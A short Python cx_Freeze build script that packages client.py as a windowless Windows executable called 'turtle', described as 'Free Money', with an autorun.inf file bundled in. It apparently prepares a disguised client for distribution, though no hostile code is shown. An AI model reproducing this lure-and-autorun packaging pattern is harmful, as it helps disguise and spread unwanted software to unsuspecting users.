import sys
from cx_Freeze import setup, Executable

include_files = ['autorun.inf']
base = None

if sys.platform == "win32":
    base = "Win32GUI"

setup(name="turtle",
      version="0.1",
      description="Free Money",
      options={'build_exe': {'include_files': include_files}},
      executables=[Executable("client.py", base=base)])